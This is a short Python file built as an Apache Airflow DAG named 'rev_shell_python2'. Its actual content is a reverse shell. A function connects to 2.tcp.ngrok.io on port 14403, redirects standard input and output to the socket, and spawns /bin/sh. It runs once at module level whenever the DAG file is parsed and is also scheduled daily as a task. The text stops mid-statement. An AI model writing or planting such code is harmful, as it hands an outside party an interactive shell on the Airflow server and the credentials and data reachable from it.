import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
    s = socket.socket()
    s.connect((rhost, port))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
    dag_id='rev_shell_python2',
    schedule_interval='0 0 * * *',
    start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
    run = PythonOperator(
        task_id='rs_python2',
        python_callable=rs,
        op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}


